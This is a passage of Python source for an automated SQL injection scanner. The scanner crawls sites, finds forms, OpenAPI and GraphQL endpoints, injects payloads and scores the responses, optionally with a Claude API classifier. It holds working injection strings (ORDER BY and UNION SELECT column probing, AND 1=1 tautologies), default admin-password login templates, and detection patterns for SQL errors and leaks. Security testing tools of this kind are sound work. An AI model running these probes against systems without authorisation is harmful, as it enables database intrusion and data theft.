    if extra: h.update(extra)
    return h

def _check_waf(status: int, body: str, printer=None):
    if status in (429, 503, 403):
        indicators = ["waf","firewall","blocked","cloudflare","incapsula",
                      "akamai","rate limit","too many requests","access denied","bot"]
        if any(i in body.lower() for i in indicators) or status == 429:
            if not _waf_warned.is_set():
                _waf_warned.set()
                msg = c("\n  ⚠  WAF / Rate-limit detected! Consider --delay 2\n", YELLOW+BOLD)
                (printer.log(msg) if printer else print(msg))

def http_get(url: str, timeout: int = REQUEST_TIMEOUT,
             extra_headers: dict = None, printer=None) -> tuple:
    ctx = _ssl_context()
    for attempt in range(MAX_RETRIES):
        start = time.time()
        try:
            req = urllib.request.Request(url, headers=_build_headers(extra_headers))
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                _check_waf(resp.status, body, printer)
                return resp.status, body, time.time() - start
        except urllib.error.HTTPError as e:
            try:    body = e.read().decode("utf-8", errors="replace")
            except: body = ""
            _check_waf(e.code, body, printer)
            if e.code in (429, 503):
                time.sleep(_req_opts.rate_delay * (RETRY_BACKOFF ** attempt)); continue
            return e.code, body, time.time() - start
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(_req_opts.rate_delay * (RETRY_BACKOFF ** attempt)); continue
            return 0, str(e), time.time() - start
    return 0, "max retries exceeded", 0.0

def http_method(method: str, url: str, data: dict = None,
                json_body=None, xml_body: str = None,
                extra_headers: dict = None,
                timeout: int = REQUEST_TIMEOUT, printer=None) -> tuple:
    ctx        = _ssl_context()
    headers    = _build_headers(extra_headers)
    body_bytes = None
    if xml_body is not None:
        body_bytes = xml_body.encode("utf-8")
        headers["Content-Type"] = "application/xml"
    elif json_body is not None:
        body_bytes = json.dumps(json_body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif data is not None:
        body_bytes = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    for attempt in range(MAX_RETRIES):
        start = time.time()
        try:
            req = urllib.request.Request(url, data=body_bytes,
                                         headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                _check_waf(resp.status, body, printer)
                return resp.status, body, time.time() - start
        except urllib.error.HTTPError as e:
            try:    body = e.read().decode("utf-8", errors="replace")
            except: body = ""
            _check_waf(e.code, body, printer)
            if e.code in (429, 503):
                time.sleep(_req_opts.rate_delay * (RETRY_BACKOFF ** attempt)); continue
            return e.code, body, time.time() - start
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(_req_opts.rate_delay * (RETRY_BACKOFF ** attempt)); continue
            return 0, str(e), time.time() - start
    return 0, "max retries exceeded", 0.0

# ──────────────────────────────────────────────────────────────────────────────
# ENDPOINT DATA CLASS
# ──────────────────────────────────────────────────────────────────────────────
class Endpoint:
    def __init__(self, url: str, method: str,
                 params: list = None,
                 source: str = "crawl",
                 content_type: str = "form",
                 vector_type: str = "query",
                 base_json: dict = None,
                 base_xml: str = None,
                 header_target: str = None,
                 cookie_param: str = None,
                 graphql_field: str = None):
        self.url           = url
        self.method        = method.upper()
        self.params        = params or []
        self.source        = source
        self.content_type  = content_type
        self.vector_type   = vector_type
        self.base_json     = base_json
        self.base_xml      = base_xml
        self.header_target = header_target
        self.cookie_param  = cookie_param
        self.graphql_field = graphql_field
        self.key = (f"{self.method}:{url}:{vector_type}:"
                    f"{header_target or ''}:{cookie_param or ''}:{graphql_field or ''}")

    def __repr__(self):
        return (f"[{self.method}] {self.url}  "
                f"vector={self.vector_type}  params={self.params}")

# ──────────────────────────────────────────────────────────────────────────────
# ROBOTS.TXT
# ──────────────────────────────────────────────────────────────────────────────
class RobotsChecker:
    def __init__(self, base_url: str, respect: bool = True, printer=None):
        self.respect = respect
        self._rp     = urllib.robotparser.RobotFileParser()
        if respect:
            robots_url = base_url.rstrip("/") + "/robots.txt"
            try:
                ctx = _ssl_context()
                req = urllib.request.Request(robots_url, headers=_build_headers())
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    content = r.read().decode("utf-8", errors="replace")
                self._rp.parse(content.splitlines())
                if printer:
                    printer.log(c(f"  [robots.txt] Loaded from {robots_url}", DIM))
            except Exception:
                pass

    def allowed(self, url: str) -> bool:
        return True if not self.respect else self._rp.can_fetch("*", url)

# ──────────────────────────────────────────────────────────────────────────────
# SQL ERROR PATTERNS
# ──────────────────────────────────────────────────────────────────────────────
SQL_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"ora-\d{5}", r"sqlite_",
    r"pg_query", r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"syntax error.*sql", r"warning.*mysql",
    r"microsoft ole db provider", r"odbc.*driver", r"jdbc.*exception",
    r"sqlexception", r"com\.mysql", r"pgsql.*error",
    r"invalid column name", r"column.*does not exist", r"sqlstate",
    r"unknown column", r"table.*doesn.t exist",
    r"you have an error in your sql",
    r"supplied argument is not a valid mysql",
    r"mysql_num_rows", r"mysql_fetch_array",
    r"division by zero",
    r"on mysql result", r"sql command not properly ended",
    r"unexpected end of sql command",
    r"data type mismatch",
    r"conversion failed when converting",
    r"invalid input syntax for",
    r"unterminated string literal",
    r"sqlite3.*error", r"unrecognized token", r"incomplete input",
    r"near.*syntax error", r"no such table", r"no such column",
    r"sequelizedatabaseerror", r"knex.*query", r"orm.*error",
    r"better-sqlite3", r"node_modules.*sqlite",
]

SQL_LEAK_PATTERNS = [
    r"\broot\b", r"\bpostgres\b", r"\binformation_schema\b",
    r"\bsys\.tables\b", r"\ball_tables\b",
    r"\bversion\(\)", r"@@version", r"@@datadir",
    r"\bpassword\b.*\bhash\b", r"\bmd5\(",
]

# ──────────────────────────────────────────────────────────────────────────────
# v7.0 FEATURE 3 — MULTI-SIGNAL DETECTION SCORING
# ──────────────────────────────────────────────────────────────────────────────

def multi_signal_score(body: str, elapsed: float,
                       status: int,
                       baseline_body: str = None,
                       baseline_status: int = 200,
                       baseline_elapsed: float = 0.0) -> Dict[str, Any]:
    score    = 0
    signals  = {}
    bl       = body.lower()

    matched_errors = [p for p in SQL_ERROR_PATTERNS if re.search(p, bl)]
    if matched_errors:
        pts = min(40, 20 + len(matched_errors) * 5)
        score += pts
        signals["sql_error"] = {"pts": pts, "matched": matched_errors[:3]}
    else:
        signals["sql_error"] = {"pts": 0, "matched": []}

    if baseline_body is not None:
        if status != baseline_status:
            pts = 20 if status == 500 else 10
            score += pts
            signals["status_anomaly"] = {"pts": pts,
                "detail": f"{baseline_status}→{status}"}
        else:
            signals["status_anomaly"] = {"pts": 0, "detail": "unchanged"}
    else:
        if status == 500:
            score += 15
            signals["status_anomaly"] = {"pts": 15, "detail": "500 (no baseline)"}
        else:
            signals["status_anomaly"] = {"pts": 0, "detail": "no baseline"}

    if baseline_body is not None:
        base_len    = len(baseline_body)
        inj_len     = len(body)
        delta_ratio = abs(inj_len - base_len) / max(base_len, 1)
        if delta_ratio > 0.3:
            pts = min(20, int(delta_ratio * 25))
            score += pts
            signals["size_anomaly"] = {"pts": pts,
                "delta_ratio": f"{delta_ratio:.2f}",
                "base_len": base_len, "inj_len": inj_len}
        else:
            signals["size_anomaly"] = {"pts": 0, "delta_ratio": f"{delta_ratio:.2f}"}
    else:
        signals["size_anomaly"] = {"pts": 0, "detail": "no baseline"}

    leaked = [p for p in SQL_LEAK_PATTERNS if re.search(p, bl)]
    if leaked:
        pts = min(20, len(leaked) * 7)
        score += pts
        signals["keyword_leak"] = {"pts": pts, "leaked": leaked[:3]}
    else:
        signals["keyword_leak"] = {"pts": 0}

    if baseline_elapsed > 0:
        delta = elapsed - baseline_elapsed
    else:
        delta = elapsed
    if delta > 4.5:
        pts = 30
    elif delta > 3.0:
        pts = 20
    elif delta > 1.5:
        pts = 10
    else:
        pts = 0
    score += pts
    signals["time_delay"] = {"pts": pts, "elapsed": f"{elapsed:.2f}s",
                             "delta": f"{delta:.2f}s"}

    if score >= 70:
        verdict    = "sqli_confirmed"
        confidence = min(99, 70 + score // 5)
    elif score >= 40:
        verdict    = "sqli_possible"
        confidence = min(69, 40 + score // 4)
    else:
        verdict    = "safe"
        confidence = max(0, 30 - score)

    return {
        "total_score": score,
        "verdict":     verdict,
        "confidence":  confidence,
        "signals":     signals,
        "detail":      (f"score={score} | "
                        + " | ".join(f"{k}={v.get('pts',0)}pts"
                                     for k, v in signals.items())),
    }

# ──────────────────────────────────────────────────────────────────────────────
# LEGACY HEURISTIC
# ──────────────────────────────────────────────────────────────────────────────
def heuristic_check(body: str, elapsed: float, base_time: float = None) -> dict:
    bl = body.lower()
    for pat in SQL_ERROR_PATTERNS:
        if re.search(pat, bl):
            return {"type": "error_based", "detail": pat}
    if base_time is not None and elapsed > base_time + 4:
        return {"type": "time_based", "detail": f"delay={elapsed - base_time:.1f}s"}
    return {}

# ──────────────────────────────────────────────────────────────────────────────
# v7.0 FEATURE 4 — BASELINE COMPARISON ENGINE
# ──────────────────────────────────────────────────────────────────────────────

class BaselineCache:
    def __init__(self):
        self._cache: Dict[str, dict] = {}
        self._lock  = threading.Lock()

    def get(self, ep_key: str) -> Optional[dict]:
        with self._lock:
            return self._cache.get(ep_key)

    def set(self, ep_key: str, baseline: dict):
        with self._lock:
            if ep_key not in self._cache:
                self._cache[ep_key] = baseline

    def diff(self, ep_key: str, inj_status: int,
             inj_body: str, inj_elapsed: float) -> dict:
        baseline = self.get(ep_key)
        if baseline is None:
            return {"has_baseline": False}

        base_body    = baseline["body"]
        base_status  = baseline["status"]
        base_elapsed = baseline["elapsed"]

        def _tok(txt):
            txt = re.sub(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', 'TS', txt)
            txt = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
                         'UUID', txt, flags=re.IGNORECASE)
            txt = re.sub(r'\b\d+\b', 'N', txt)
            return set(re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', txt.lower()))

        ta, tb = _tok(base_body), _tok(inj_body)
        inter  = len(ta & tb)
        union  = len(ta | tb)
        jacc   = inter / union if union > 0 else 1.0

        unique_in_injected = list(tb - ta)[:20]

        sql_keywords_leaked = [t for t in unique_in_injected
                                if t in ("error","syntax","sql","mysql","sqlite",
                                         "postgres","oracle","mssql","column",
                                         "table","query","select","union","where")]

        size_delta  = abs(len(inj_body) - len(base_body))
        size_ratio  = size_delta / max(len(base_body), 1)
        time_delta  = inj_elapsed - base_elapsed
        status_diff = inj_status != base_status

        return {
            "has_baseline":          True,
            "jaccard":               jacc,
            "size_delta":            size_delta,
            "size_ratio":            size_ratio,
            "time_delta":            time_delta,
            "status_diff":           status_diff,
            "base_status":           base_status,
            "inj_status":            inj_status,
            "sql_keywords_leaked":   sql_keywords_leaked,
            "unique_tokens_injected": unique_in_injected,
            "suspicious": (
                jacc < 0.80
                or size_ratio > 0.35
                or status_diff
                or bool(sql_keywords_leaked)
                or time_delta > 3.5
            ),
        }

# ──────────────────────────────────────────────────────────────────────────────
# BOOLEAN-BLIND DIFF
# ──────────────────────────────────────────────────────────────────────────────
def _tokenize(text: str) -> set:
    text = re.sub(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', 'TIMESTAMP', text)
    text = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
                  'UUID', text, flags=re.IGNORECASE)
    text = re.sub(r'\b\d+\b', 'NUM', text)
    return set(re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', text.lower()))

def jaccard_similarity(a: str, b: str) -> float:
    ta, tb = _tokenize(a), _tokenize(b)
    if not ta and not tb: return 1.0
    inter = len(ta & tb)
    union = len(ta | tb)
    return inter / union if union > 0 else 1.0

def boolean_blind_check(body_true: str, body_false: str, body_benign: str) -> dict:
    sim_tf = jaccard_similarity(body_true, body_false)
    sim_tb = jaccard_similarity(body_true, body_benign)
    sim_fb = jaccard_similarity(body_false, body_benign)
    if sim_tf < 0.85 and (sim_tb > 0.85 or sim_fb > 0.85):
        return {
            "type":   "boolean_blind",
            "detail": (f"TRUE/FALSE Jaccard={sim_tf:.3f}  "
                       f"TRUE/benign={sim_tb:.3f}  FALSE/benign={sim_fb:.3f}"),
        }
    return {}

# ──────────────────────────────────────────────────────────────────────────────
# UNION COLUMN BRUTER
# ──────────────────────────────────────────────────────────────────────────────
def _brute_union_columns(send_fn, ep: "Endpoint", max_cols: int = 20) -> Optional[int]:
    for n in range(1, max_cols + 1):
        status, body, _ = send_fn(ep, f"' ORDER BY {n}--")
        bl = body.lower()
        if any(re.search(p, bl) for p in [r"unknown column",r"order.*by.*out",r"1 was unexpected"]):
            return n - 1
        if status == 500: return n - 1
    for n in range(1, max_cols + 1):
        nulls   = ",".join(["NULL"] * n)
        status, body, _ = send_fn(ep, f"' UNION SELECT {nulls}--")
        if status == 200 and not any(re.search(p, body.lower())
                                     for p in [r"sql syntax",r"error",r"exception"]):
            return n
    return None

# ──────────────────────────────────────────────────────────────────────────────
# JSON / XML BODY INJECTION HELPERS
# ──────────────────────────────────────────────────────────────────────────────
def _inject_json_leaf(obj, path: list, payload: str):
    result = copy.deepcopy(obj)
    node   = result
    for key in path[:-1]: node = node[key]
    node[path[-1]] = payload
    return result

def _json_leaf_paths(obj, prefix=None) -> List[list]:
    if prefix is None: prefix = []
    paths = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            paths.extend(_json_leaf_paths(v, prefix + [k]))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            paths.extend(_json_leaf_paths(v, prefix + [i]))
    else:
        paths.append(prefix)
    return paths

def _inject_xml_node(xml_str: str, target_tag: str, payload: str) -> str:
    return re.sub(
        r'(<' + re.escape(target_tag) + r'[^>]*>)[^<]*(</)',
        r'\g<1>' + payload.replace('&','&amp;').replace('<','&lt;') + r'\2',
        xml_str)

# ──────────────────────────────────────────────────────────────────────────────
# v7.0 FEATURE 1 — ENHANCED POST + JSON INJECTION ENGINE
# ──────────────────────────────────────────────────────────────────────────────

LOGIN_JSON_TEMPLATES = [
    {"username": "admin", "password": "password"},
    {"email": "admin@example.com", "password": "password"},
    {"user": "admin", "pass": "password"},
    {"login": "admin", "password": "password"},
    {"username": "admin", "password": "password", "remember": False},
    {"email": "admin@example.com", "password": "password", "token": ""},
]

def _probe_json_body(url: str, method: str, printer=None) -> Optional[dict]:
    for template in LOGIN_JSON_TEMPLATES:
        status, body, _ = http_method(method, url, json_body=template, printer=printer)
        if status not in (404, 405, 415, 0):
            return template
    generic = {"id": "1", "q": "test"}
    status, _, _ = http_method(method, url, json_body=generic, printer=printer)
    if status not in (404, 405, 415, 0):
        return generic
    return None

def build_json_endpoints(ep: "Endpoint", printer=None) -> List["Endpoint"]:
    if ep.method not in ("POST", "PUT", "PATCH"):
        return []

    if ep.base_json:
        base = ep.base_json
    elif _is_login_endpoint(ep):
        base = None
        for template in LOGIN_JSON_TEMPLATES:
            status, _, _ = http_method(ep.method, ep.url,
                                       json_body=template, printer=printer)
            if status not in (404, 405, 415, 0):
                base = template
                break
        if base is None:
            base = LOGIN_JSON_TEMPLATES[0]
    else:
        base = _probe_json_body(ep.url, ep.method, printer=printer)

    if not base:
        return []

    leaf_paths = _json_leaf_paths(base)
    sub_eps    = []
    for path in leaf_paths:
        param_name = str(path[-1])
        sub_ep = Endpoint(
            url          = ep.url,
            method       = ep.method,
            params       = [param_name],
            source       = f"json_leaf:{ep.source}",
            content_type = "json",
            vector_type  = "json",
            base_json    = base,
        )
        sub_ep._json_path = path   # type: ignore[attr-defined]
        sub_eps.append(sub_ep)
    return sub_eps

# ──────────────────────────────────────────────────────────────────────────────
# GRAPHQL HELPERS
# ──────────────────────────────────────────────────────────────────────────────
def _graphql_introspect(url: str, printer=None) -> list:
    query = {"query": "{ __schema { queryType { fields { name args { name type { name kind } } } } } }"}
    status, body, _ = http_method("POST", url, json_body=query, printer=printer)
    if status != 200: return []
    try:
        data   = json.loads(body)
        fields = (data.get("data",{}).get("__schema",{})
                     .get("queryType",{}).get("fields",[]))
        results = []
        for f in fields:
            for arg in f.get("args",[]):
                if arg.get("type",{}).get("name") in ("String","ID",None):
                    results.append((f["name"], arg["name"]))
        return results
    except Exception: return []

def _graphql_inject_payload(field: str, arg: str, payload: str) -> dict:
    return {"query": f'{{ {field}({arg}: "{payload.replace(chr(34), chr(92)+chr(34))}") {{ id }} }}'}

# ──────────────────────────────────────────────────────────────────────────────
# CLAUDE API
# ──────────────────────────────────────────────────────────────────────────────
def claude_classify(payload: str, response_body: str, elapsed: float,
                    method: str = "GET", vector: str = "query",
                    technique: str = "", multi_score: dict = None) -> dict:
    score_ctx = ""
    if multi_score:
        score_ctx = (f"\nMULTI-SIGNAL SCORE: {multi_score.get('total_score',0)} "
                     f"({multi_score.get('detail','')})")
    prompt = (
        f"You are a SQL injection security analyst.\n\n"
        f"HTTP METHOD   : {method}\n"
        f"VECTOR TYPE   : {vector}\n"
        f"TECHNIQUE     : {technique or 'unknown'}\n"
        f"INPUT PAYLOAD : {payload}\n"
        f"RESPONSE BODY (first 1000 chars): {response_body[:1000]}\n"
        f"RESPONSE TIME : {elapsed:.2f}s{score_ctx}\n\n"
        "Classify as 'sqli_confirmed', 'sqli_possible', or 'safe'.\n"
        "Respond ONLY with JSON (no markdown):\n"
        '{"verdict":"...","confidence":0-100,"evidence":[],"reason":"..."}'
    )
    payload_bytes = json.dumps({
        "model": CLAUDE_MODEL, "max_tokens": 400,
        "messages": [{"role": "user", "content": prompt}]
    }).encode()
    req = urllib.request.Request(
        ANTHROPIC_API_URL, data=payload_bytes,
        headers={"Content-Type": "application/json",
                 "x-api-key": ANTHROPIC_API_KEY,
                 "anthropic-version": "2023-06-01"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
            text = "".join(b.get("text","") for b in data.get("content",[]))
            return json.loads(text.replace("```json","").replace("```","").strip())
    except Exception as e:
        return {"verdict":"safe","confidence":0,"evidence":[],
                "reason":f"Claude API error: {e}"}

# ──────────────────────────────────────────────────────────────────────────────
# FALSE POSITIVE VERIFICATION
# ──────────────────────────────────────────────────────────────────────────────
def verify_true_positive(result: dict, send_fn, ep: "Endpoint",
                         use_claude: bool = True) -> dict:
    r             = dict(result)
    payload       = r["payload"]
    injected_body = r.get("body","")
    elapsed       = r.get("elapsed", 0.0)
    method        = r.get("method","GET")
    vector        = r.get("vector_type","query")

    _, benign_body, _ = send_fn(ep, "1")
    if not injected_body:
        _, injected_body, elapsed = send_fn(ep, payload)

    checks = {}
    bl_i = injected_body.lower()
    bl_b = benign_body.lower()
    errors_injected = [p for p in SQL_ERROR_PATTERNS if re.search(p, bl_i)]
    errors_benign   = [p for p in SQL_ERROR_PATTERNS if re.search(p, bl_b)]
    if errors_benign:
        checks["baseline_diff"] = {"pass": False,
            "detail": f"Benign input also triggers SQL error: {errors_benign[:2]}"}
    elif errors_injected:
        checks["baseline_diff"] = {"pass": True,
            "detail": f"SQL error only in injected: {errors_injected[:2]}"}
    else:
        checks["baseline_diff"] = {
            "pass": injected_body[:300] != benign_body[:300],
            "detail": ("Responses differ" if injected_body[:300] != benign_body[:300]
                       else "Identical responses")}

    _, body_true,  _ = send_fn(ep, "' AND 1=1--")
    _, body_false, _ = send_fn(ep, "' AND 1=2--")
    sim = jaccard_similarity(body_true, body_false)
    checks["tautology_pair"] = {
        "pass":   sim < 0.90,
        "detail": f"TRUE/FALSE Jaccard={sim:.3f}",
    }

    if use_claude:
        prompt = (
            "SQL injection false-positive verification.\n"
            f"METHOD: {method}  VECTOR: {vector}  PAYLOAD: {payload}\n"
            f"INJECTED RESPONSE (600c):\n{injected_body[:600]}\n\n"
            f"BENIGN RESPONSE (600c):\n{benign_body[:600]}\n\n"
            "Is this a REAL SQL injection (not a false positive)?\n"
            'JSON only: {"true_positive":true/false,"confidence":0-100,"reason":"..."}'
        )
        pb = json.dumps({
            "model": CLAUDE_MODEL, "max_tokens": 300,
            "messages": [{"role": "user", "content": prompt}]
        }).encode()
        req = urllib.request.Request(
            ANTHROPIC_API_URL, data=pb,
            headers={"Content-Type": "application/json",
                     "x-api-key": ANTHROPIC_API_KEY,
                     "anthropic-version": "2023-06-01"})
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                data   = json.loads(resp.read())
                text   = "".join(b.get("text","") for b in data.get("content",[]))
                parsed = json.loads(text.replace("```json","").replace("```","").strip())
                checks["claude_confirm"] = {
                    "pass":       bool(parsed.get("true_positive", False)),
                    "confidence": int(parsed.get("confidence", 0)),
                    "detail":     parsed.get("reason",""),
                }
        except Exception as e:
            checks["claude_confirm"] = {"pass": True, "confidence": 50,
                                        "detail": f"Claude FP-check error: {e}"}

    active   = {k: v for k, v in checks.items() if v is not None}
    passed   = sum(1 for v in active.values() if v.get("pass", False))
    total    = len(active)
    if "claude_confirm" not in active:
        # Without Claude's judgment as a third, independent signal, the
        # majority-vote formula below degrades to "any one check passing
        # is enough" (ceil(2/2) == 1) — meaning baseline_diff alone (a
        # weak signal: almost any malformed input produces a *different*
        # response than a clean control value, regardless of whether
        # real SQL execution happened) is sufficient to mark something a
        # verified TRUE POSITIVE, even when tautology_pair — the check
        # actually meant to distinguish real conditional SQLi from noise
        # — explicitly fails. Confirmed real case: every one of ~90
        # payloads across 5 endpoints (testaspnet.vulnweb.com,
        # 2026-08-14) showed exactly this "baseline_diff pass /
        # tautology_pair fail" pattern and every one was still reported
        # as a verified TRUE POSITIVE. This pipeline always runs with
        # --no-claude, so this branch is not an edge case here — it is
        # the only path this code ever actually takes. Requiring
        # unanimous agreement between the two remaining checks is the
        # appropriate bar once the tie-breaking third signal is gone,
        # not a weaker one.
        verified = passed == total
    else:
        verified = passed >= max(1, math.ceil(total / 2))
    summary  = " | ".join(
        f"{'✓' if v.get('pass') else '✗'} {k}: {v.get('detail','')[:80]}"
        for k, v in active.items())
    r["fp_check"] = {
        "verified_true_positive": verified,
        **checks,
        "checks_passed": passed,
        "checks_total":  total,
        "summary":       summary,
    }
    return r

# ──────────────────────────────────────────────────────────────────────────────
# WEB CRAWLER
# ──────────────────────────────────────────────────────────────────────────────
class WebCrawler:
    AXIOS_RE  = re.compile(
        r'axios\.(get|post|put|patch|delete)\s*\(\s*["\`\'"]([^"\`\' ]+)["\`\'"]',
        re.IGNORECASE)
    FETCH_RE  = re.compile(r'fetch\s*\(\s*["\`\'"]([^"\`\' ]+)["\`\'"]', re.IGNORECASE)
    API_RE    = re.compile(
        r'["\`\'"]'
        r'((?:/(?:api|rest|v\d+|graphql|service|data|json)[^"\`\' \n]*)'
        r'|(?:/[a-zA-Z0-9_\-/]+\.php[^"\`\' \n]*))'
        r'["\`\'"]', re.IGNORECASE)
    JQUERY_RE = re.compile(
        r'\$\.(get|post|ajax|getJSON)\s*\(\s*["\`\'"]([^"\`\' ]+)["\`\'"]',
        re.IGNORECASE)
    HTTP_RE   = re.compile(
        r'\$http\.(get|post|put|patch|delete)\s*\(\s*["\`\'"]([^"\`\' ]+)["\`\'"]',
        re.IGNORECASE)

    SPEC_PATHS = [
        "/sitemap.xml","/sitemap_index.xml","/sitemap.txt",
        "/openapi.json","/openapi.yaml","/swagger.json","/swagger.yaml",
        "/api-docs","/api-docs/swagger.json","/v2/api-docs","/v3/api-docs",
        "/api/swagger.json","/swagger/v1/swagger.json",
        "/api/openapi.json","/docs/openapi.json",
    ]

    def __init__(self, base_url: str, printer: SafePrinter,
                 max_pages: int = CRAWL_MAX_PAGES,
                 max_depth: int = CRAWL_MAX_DEPTH,
                 threads: int = CRAWL_THREADS,
                 verbose: bool = True,
                 robots: RobotsChecker = None):
        parsed               = urllib.parse.urlparse(base_url)
        self.origin          = f"{parsed.scheme}://{parsed.netloc}"
        self.base            = base_url
        self.printer         = printer
        self.max_pages       = max_pages
        self.max_depth       = max_depth
        self.threads         = threads
        self.verbose         = verbose
        self.robots          = robots or RobotsChecker(base_url, respect=False)
        self._allowed        = {self.origin}
        for extra in _req_opts.allowed_scope:
            self._allowed.add(extra.rstrip("/"))
        self._visited        = set()
        self._vis_lock       = threading.Lock()
        self._ep_lock        = threading.Lock()
        self.endpoints       = {}
        self.js_files        = set()
        self._js_lock        = threading.Lock()
        self._graphql_probed = set()
        self._learned_paths  = set()

    def _log(self, msg): self.printer.log(msg)

    def normalize(self, url: str) -> Optional[str]:
        if not url or url.startswith(("mailto:","javascript:","data:","#")):
            return None
        if url.startswith("//"): url = "https:" + url
        if url.startswith("/"): url = self.origin + url
        parsed = urllib.parse.urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin not in self._allowed: return None
        return url.split("#")[0].rstrip("/") or self.origin

    def _parse_sitemap(self, url: str) -> list:
        urls = []
        status, body, _ = http_get(url, printer=self.printer)
        if status != 200 or not body: return urls
        if url.endswith(".txt"):
            for line in body.splitlines():
                n = self.normalize(line.strip())
                if n: urls.append(n)
            return urls
        try:
            root   = ET.fromstring(body)
            ns_map = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
            for sm in root.findall("sm:sitemap/sm:loc", ns_map):
                child_url = sm.text.strip() if sm.text else ""
                if child_url: urls.extend(self._parse_sitemap(child_url))
            for loc in root.findall("sm:url/sm:loc", ns_map):
                loc_url = loc.text.strip() if loc.text else ""
                n = self.normalize(loc_url)
                if n: urls.append(n)
        except Exception:
            for loc_text in re.findall(r'<loc>(.*?)</loc>', body, re.IGNORECASE):
                n = self.normalize(loc_text.strip())
                if n: urls.append(n)
        return urls

    def _ingest_openapi(self, url: str):
        status, body, _ = http_get(url, printer=self.printer)
        if status != 200 or not body: return
        try: spec = json.loads(body)
        except Exception: return
        servers   = spec.get("servers",[])
        base_path = servers[0].get("url","") if servers else spec.get("basePath","")
        paths     = spec.get("paths",{})
        self._log(c(f"  [OpenAPI] {len(paths)} path(s) in spec at {url}", CYAN))
        for path, methods in paths.items():
            full_url = self.origin + base_path.rstrip("/") + path
            for method, op in methods.items():
                if method.upper() not in ("GET","POST","PUT","PATCH","DELETE","HEAD"):
                    continue
                params = [p.get("name","") for p in op.get("parameters",[])
                          if p.get("in") in ("query","path","formData")]
                req_body   = op.get("requestBody",{})
                json_props = (req_body.get("content",{})
                              .get("application/json",{})
                              .get("schema",{})
                              .get("properties",{}))
                if json_props:
                    params.extend(json_props.keys())
                    base_json    = {k: "1" for k in json_props}
                    resolved_url = re.sub(r'\{[^}]+\}', '1', full_url)
                    self._add_endpoint(Endpoint(
                        resolved_url, method.upper(), list(json_props.keys()),
                        source="openapi", content_type="json",
                        vector_type="json", base_json=base_json))
                if params:
                    resolved_url = re.sub(r'\{[^}]+\}', '1', full_url)
                    self._add_endpoint(Endpoint(
                        resolved_url, method.upper(),
                        [p for p in params if p],
                        source="openapi", vector_type="query"))

    def _discover_specs(self) -> list:
        seeds = []
        for path in self.SPEC_PATHS:
            url = self.origin + path
            if not self.robots.allowed(url): continue
            status, body, _ = http_get(url, printer=self.printer)
            if status != 200 or not body: continue
            if "sitemap" in path:
                new_urls = self._parse_sitemap(url)
                if new_urls:
                    self._log(c(f"  [Sitemap] {url} → {len(new_urls)} URL(s)", CYAN))
                    seeds.extend(new_urls)
            elif any(k in path for k in ("openapi","swagger","api-docs","v2","v3")):
                self._ingest_openapi(url)
        return seeds

    def _add_endpoint(self, ep: Endpoint):
        with self._ep_lock:
            if ep.key not in self.endpoints:
                self.endpoints[ep.key] = ep
                mc = METHOD_COLORS.get(ep.method, RESET)
                self._log(
                    f"    {c(f'[{ep.method}]', mc+BOLD):<20} "
                    f"{c(ep.url[:65], DIM)}  "
                    f"{c(f'({ep.source}/{ep.vector_type})', DIM)}")

    def _probe_graphql(self, url: str):
        if url in self._graphql_probed: return
        self._graphql_probed.add(url)
        fields = _graphql_introspect(url, printer=self.printer)
        for field, arg in fields:
            self._log(c(f"  [GraphQL] Injectable arg: {field}({arg})", CYAN))
            self._add_endpoint(Endpoint(
                url, "POST", params=[arg],
                source="graphql", content_type="json",
                vector_type="graphql", graphql_field=field))

    def extract_links(self, html: str, base_url: str) -> list:
        raw = set()
        for attr in ('href','src','action','ping'):
            for val in re.findall(rf'{attr}=["\']([^"\']+)["\']', html, re.IGNORECASE):
                raw.add(val)
        for val in re.findall(r'data-(?:href|url|link|src|action)=["\']([^"\']+)["\']',
                              html, re.IGNORECASE):
            raw.add(val)
        links = []
        for href in raw:
            n = self.normalize(urllib.parse.urljoin(base_url, href))
            if n: links.append(n)
        return links

    def extract_forms(self, html: str, base_url: str) -> list:
        eps = []
        pattern = (r'<form(?:[^>]*?action=["\']?([^"\'> ]*)["\']?)?'
                   r'(?:[^>]*?method=["\']?([^"\'> ]*)["\']?)?[^>]*?>(.*?)</form>')
        for m in re.finditer(pattern, html, re.IGNORECASE | re.DOTALL):
            action = (m.group(1) or "").strip() or base_url
            method = (m.group(2) or "GET").upper()
            body   = m.group(3) or ""
            action = self.normalize(urllib.parse.urljoin(base_url, action)) or base_url
            fields = (re.findall(r'<input[^>]*name=["\']?([^"\'> ]+)["\']?',    body, re.IGNORECASE)
                    + re.findall(r'<textarea[^>]*name=["\']?([^"\'> ]+)["\']?', body, re.IGNORECASE)
                    + re.findall(r'<select[^>]*name=["\']?([^"\'> ]+)["\']?',   body, re.IGNORECASE))
            if fields or method in ("POST","PUT","PATCH"):
                eps.append(Endpoint(action, method, fields, "form", vector_type="form"))
        return eps

    def extract_js_endpoints(self, js: str, base_url: str) -> list:
        eps, seen = [], set()
        def add(url, method, params=None):
            if url and url not in seen:
                seen.add(url)
                parsed_url = urllib.parse.urlparse(url)
